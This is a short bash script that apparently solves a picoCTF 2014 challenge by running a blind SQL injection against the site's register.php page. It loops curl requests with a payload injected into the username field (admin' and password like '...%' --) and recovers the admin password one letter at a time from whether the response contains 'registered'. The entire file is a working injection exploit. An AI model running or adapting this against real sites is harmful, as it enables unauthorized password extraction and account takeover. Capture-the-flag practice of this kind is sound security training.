#!/bin/bash

STRING='';
URL='http://web2014.picoctf.com/injection4/register.php';

for n in {1..27};
do
	for i in {a..z};
	do 
		rt=$(curl -s "$URL" --data "username=admin%27+and+password+like+%27$STRING$i%25%27+--+&action=Register");

		if [[ $rt == *"registered"* ]]
		then
		  	echo $STRING$i;
			STRING=$STRING$i;
			break
		fi
	done
done